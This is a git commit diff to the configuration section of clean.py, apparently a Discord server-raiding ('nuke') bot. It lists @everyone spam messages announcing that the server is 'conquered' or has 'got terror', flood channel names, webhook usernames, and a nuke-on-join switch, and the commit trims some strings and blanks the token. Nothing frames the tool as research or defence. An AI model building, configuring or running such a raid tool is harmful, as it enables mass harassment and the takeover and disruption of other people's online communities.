252732daf62b04606591faf8b0dc46f8fa1e3766
dfdddfd <60836631+dfdddfd@users.noreply.github.com>
2020-09-21 10:51:17 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -1,11 +1,11 @@
 #BOT CONFIG
-token = "토큰"
+token = "token"
 prefix = "!"
 
 #NUKE CONFIG
-spam_messages = ["@everyone RUSH B", "@everyone BLYAT", "Your server has been conquered. @everyone", "https://media.discordapp.net/attachments/745833936784982109/753774340201250866/1.jpg?width=671&height=671 @everyone","https://media.discordapp.net/attachments/745833936784982109/753772484892950559/-.-1.jpg?width=671&height=671","Hey! Your SerVer is got terror! It's terrible!!!!!!!!!!!!!! @everyone", "느그섭 쩔드라 @everyone"
+spam_messages = ["@everyone RUSH B", "@everyone BLYAT","https://media.discordapp.net/attachments/745833936784982109/753774340201250866/1.jpg?width=671&height=671 @everyone","https://media.discordapp.net/attachments/745833936784982109/753772484892950559/-.-1.jpg?width=671&height=671","Hey! Your SerVer is got terror! It's terrible!!!!!!!!!!!!!! @everyone"]
 channel_names = ["RUSH B", "BLYAT","HEY"]
-webhook_usernames = ["OW", "OH, I DON'T KNOW YHIS SERVER WILL GOT TERROR", "CONQUERED SERVER", "느그섭 쩔드라"]
+webhook_usernames = ["OW", "OH, I DON'T KNOW YHIS SERVER WILL GOT TERROR"]
 nuke_on_join = False
 nuke_wait_time = 0
 
